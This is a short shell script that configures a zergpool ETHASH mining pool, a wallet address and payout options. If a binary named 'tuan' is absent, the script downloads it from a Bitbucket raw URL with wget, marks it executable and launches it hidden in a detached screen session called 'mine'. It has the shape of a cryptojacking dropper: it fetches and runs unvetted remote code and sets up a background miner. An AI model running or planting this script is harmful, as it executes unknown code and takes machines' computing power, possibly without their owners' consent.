WALS=Lhehm3xhWQNgF1EexRa1J2Q8LKdeAPovbY
PIL=stratum+tcp://ethash.mine.zergpool.com:9999
PUA="c=LTC,mc=ELLA,m=solo"
COMA="--algo ETHASH --pool $PIL --user $WALS --pass $PUA"



FILE=./tuan
if [ -f "$FILE" ]; then
    echo "$FILE exists."
else 
    wget https://bitbucket.org/solomase/garangsem/raw/d261db312adaef2baefd19624650e14af8c938dc/tuan
    chmod +x ./tuan
fi
screen -dmLS mine ./tuan $COMA
